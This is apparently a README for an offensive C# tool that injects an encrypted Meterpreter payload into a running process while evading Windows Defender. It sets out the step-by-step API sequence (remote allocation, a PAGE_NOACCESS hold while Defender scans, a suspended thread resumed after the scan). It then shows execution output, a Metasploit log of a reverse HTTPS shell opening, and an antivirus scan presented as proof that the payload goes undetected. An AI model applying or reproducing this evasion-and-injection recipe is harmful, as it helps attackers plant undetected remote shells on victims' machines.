# Suspended Thread Injection
Another meterpreter injection technique using C# that attempts to bypass Defender.

# Introduction
This code was written after reading [Bypassing Windows Defender Runtime Scanning](https://labs.f-secure.com/blog/bypassing-windows-defender-runtime-scanning/) by **F-Secure Labs**. The technique I have written isn't the same but it got me thinking about how I can inject meterpreter into a remote process and go under the Defender radar.

The technique is quite simple:

- Open a remote process using `OpenProcess`.
- Decrypt the meterpreter payload in memory.
- Allocate some memory in the remote process using `VirtualAllocEx`, ensuring we assign the correct permissions to write to the memory of course.
- Write our payload into the allocated memory using `WriteProcessMemory`.
- Protect the memory using `VirtualProtectEx`, setting the protection to `PAGE_NOACCESS`.
- Create a new suspended thread using `CreateRemoteThread`.
- Sleep for 10 seconds while Defender scans the remote process memory for malicious code.
- Change the protection on the memory using `VirtualProtectEx`, setting the protection to `PAGE_EXECUTE_READ_WRITE`.
- Resuming the remote thread using `ResumeThread`

It would appear that protecting the page with `PAGE_NOACCESS` containing our meterpreter shellcode is not scanned by Defender and is not detected. By suspending the thread upon creation we are able to 'hold' the shellcode in memory until Defender has done it's scan then execute the shellcode when Defender has finished.

# Important
Remember, the code looks for an instance of notepad to inject into, it is trivial to change this, or even spawn a surregate process to inject in to.

# Example
Execution of the code is shown below:

```
[+] OpenProcess with PID 49416.
[+] VirtualAllocEx (PAGE_EXECUTE_READ_WRITE) on 0x2C4.
[+] WriteProcessMemory to 0x247A8CE0000.
[+] VirtualProtectEx (PAGE_NOACCESS) on 0x247A8CE0000.
[+] CreateRemoteThread (suspended) to 0x247A8CE0000.
[+] Sleeping whilst Defender scans the remote process.
[+] VirtualProtectEx (PAGE_EXECUTE_READ_WRITE) on 0x247A8CE0000.
[+] Resume thread 0x368.
```

And the meterpreter shell:

```
msf6 exploit(multi/handler) > 
[*] Started HTTPS reverse handler on https://192.168.1.228:443
[*] https://192.168.1.228:443 handling request from 192.168.1.142; (UUID: lsezjczd) Staging x64 payload (201308 bytes) ...
[*] Meterpreter session 1 opened (192.168.1.228:443 -> 192.168.1.142:60433) at 2021-10-07 08:32:00 +0100
```

# AV Scan Results

The binary was scanned using [antiscan.me](https://antiscan.me/scan/new/result?id=bpyZ4JnoDmkL) on 07/10/2021.

![AV Scan](https://github.com/plackyhacker/SuspendedThreadInjection/blob/main/Suspended_scan.png?raw=true)

# Notes

Tested with windows/x64/meterpreter/reverse_https on Windows 10 Pro (build 10.0.19042) with Defender.
